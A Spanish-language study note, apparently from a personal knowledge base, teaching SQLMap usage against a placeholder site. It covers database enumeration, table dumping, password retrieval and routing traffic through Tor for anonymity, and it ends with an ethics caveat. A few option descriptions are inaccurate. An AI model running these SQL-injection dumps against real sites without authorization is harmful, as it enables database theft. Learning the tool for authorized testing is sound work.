---
title: "Sqlmap"
date: 2026-01-26
tags:
  - ciberseguridad
  - fundamentos
---
**SQLMap** es una herramienta de **pruebas de penetración** que automatiza la detección y explotación de **vulnerabilidades SQL injection** en aplicaciones web. SQL injection (SQLi) es una de las vulnerabilidades más comunes y peligrosas (incluida en el [[owasp|OWASP Top 10]]), que permite a los atacantes ejecutar comandos SQL arbitrarios en una base de datos, lo que podría resultar en el robo de datos, manipulación de bases de datos o incluso el control total del servidor de base de datos.

> **Relacionado**: Se usa frecuentemente junto con [[Burp-suite|Burp Suite]] para interceptar requests y luego automatizar la explotación.

SQLMap se utiliza para identificar y explotar estas vulnerabilidades de manera rápida y eficiente, con una gran cantidad de opciones para personalizar los ataques.

### **Instalación de SQLMap**

#### En **Kali Linux** (y distribuciones similares):
SQLMap viene preinstalado en **Kali Linux**, por lo que no necesitarás instalarlo. Puedes verificar si está disponible ejecutando el siguiente comando:

```bash
sqlmap --version
```

Si no está instalado, puedes hacerlo desde el repositorio oficial de tu distribución:

```bash
sudo apt update
sudo apt install sqlmap
```

#### En **otras distribuciones Linux** o **MacOS**:

Puedes instalar SQLMap directamente desde su repositorio en GitHub:

```bash
git clone https://github.com/sqlmapproject/sqlmap.git --depth 1
cd sqlmap
```

O bien, puedes instalarlo usando `pip` si tienes **Python 2.7** o **Python 3.x** instalado:

```bash
pip install sqlmap
```

### **Uso básico de SQLMap**

#### Sintaxis básica:

```bash
sqlmap -u <URL> --risk=<nivel> --level=<nivel> 
```

- `-u <URL>`: La URL de la aplicación web que deseas probar. Deberás identificar un parámetro vulnerable a SQL injection, como por ejemplo:
  - `http://example.com/product?id=1`
- `--risk`: Define el nivel de riesgo del ataque (por defecto es 1). Cuanto mayor es el número, más riesgosas (y más invasivas) son las pruebas realizadas.
  - Ejemplo: `--risk=3`
- `--level`: Define el nivel de profundidad de las pruebas. El valor predeterminado es 1, pero puedes establecer un valor de hasta 5.
  - Ejemplo: `--level=5`

#### Ejemplo de uso:

Para probar una URL con un parámetro vulnerable a SQLi, por ejemplo:

```bash
sqlmap -u "http://example.com/product?id=1"
```

SQLMap automáticamente intentará detectar si el parámetro `id` está vulnerable a **SQL Injection**.

### **Opciones importantes**

SQLMap tiene una gran cantidad de opciones que puedes utilizar para personalizar el ataque. A continuación te muestro algunas de las más útiles:

#### **1. Detectar y enumerar bases de datos**

Para detectar las bases de datos disponibles en el servidor, puedes usar el parámetro `--dbs`:

```bash
sqlmap -u "http://example.com/product?id=1" --dbs
```

Esto mostrará todas las bases de datos que SQLMap ha detectado como accesibles desde el servidor.

#### **2. Enumerar tablas dentro de una base de datos**

Una vez que sepas qué bases de datos están disponibles, puedes enumerar las tablas dentro de una base de datos específica. Usando la opción `-D` seguido del nombre de la base de datos y `--tables`:

```bash
sqlmap -u "http://example.com/product?id=1" -D nombre_base_de_datos --tables
```

#### **3. Enumerar columnas de una tabla**

Para enumerar las columnas de una tabla específica en una base de datos:

```bash
sqlmap -u "http://example.com/product?id=1" -D nombre_base_de_datos -T nombre_tabla --columns
```

#### **4. Descargar datos de una tabla**

Una vez que tengas las columnas, puedes intentar extraer los datos de una tabla usando la opción `--dump`:

```bash
sqlmap -u "http://example.com/product?id=1" -D nombre_base_de_datos -T nombre_tabla --dump
```

Esto descargará todos los registros de la tabla especificada.

#### **5. Especificar el tipo de inyección (GET, POST, etc.)**

Si el parámetro vulnerable no es parte de la URL, sino que está en el cuerpo de una solicitud POST o en las cabeceras, puedes especificar el tipo de solicitud con la opción `-d` para **POST** o `-H` para cabeceras HTTP:

- **Para pruebas con POST:**

  ```bash
  sqlmap -u "http://example.com/search" --data="search=term" --method=POST
  ```

- **Para pruebas con cabeceras:**

  ```bash
  sqlmap -u "http://example.com" -H "User-Agent:Mozilla/5.0" -H "Cookie:PHPSESSID=xxxxxxx"
  ```

#### **6. Forzar el uso de un proxy (por ejemplo, Tor)**

Si deseas hacer las pruebas de manera anónima, puedes hacer que SQLMap pase todo el tráfico a través de un **proxy**, como **Tor** o **Burp Suite**. Esto es útil para ocultar tu IP real durante las pruebas.

Ejemplo con Tor (usando un proxy SOCKS5):

```bash
sqlmap -u "http://example.com/product?id=1" --proxy="socks5://127.0.0.1:9050"
```

#### **7. Usar un diccionario personalizado para pruebas de inyección**

Puedes usar diccionarios personalizados para SQLMap, lo que te permite realizar ataques de **fuerza bruta** si tienes sospechas de que las contraseñas o nombres de usuario podrían estar involucrados.

```bash
sqlmap -u "http://example.com/product?id=1" --passwords --threads=10 --tamper=space2comment
```

### **Manejo de errores comunes**

1. **Error de "invalid URL"**: Si ves este error, verifica que la URL que estás utilizando esté bien formateada y que el parámetro `id` o cualquier otro que estés utilizando sea vulnerable a SQLi.
2. **"Can't detect vulnerability"**: Si SQLMap no detecta una vulnerabilidad, es posible que el sitio esté protegiéndose contra inyecciones SQL. Puedes intentar con un nivel más alto de pruebas (`--level=5`).
3. **Tiempo de espera**: A veces, un servidor puede tardar mucho en responder. Puedes ajustar el tiempo de espera con la opción `--timeout`.

### **Conclusión**

**SQLMap** es una herramienta muy poderosa para detectar y explotar vulnerabilidades de **SQL injection**. Sus funciones automatizadas y personalizables hacen que sea muy útil tanto para **pentesters** como para **auditores de seguridad**. Es importante usarla de manera ética y legal, obteniendo siempre el permiso adecuado para realizar pruebas en sistemas que no te pertenecen.

Si tienes más preguntas sobre cómo usar SQLMap o cómo interpretarlo, no dudes en preguntar. ¡Estoy aquí para ayudarte!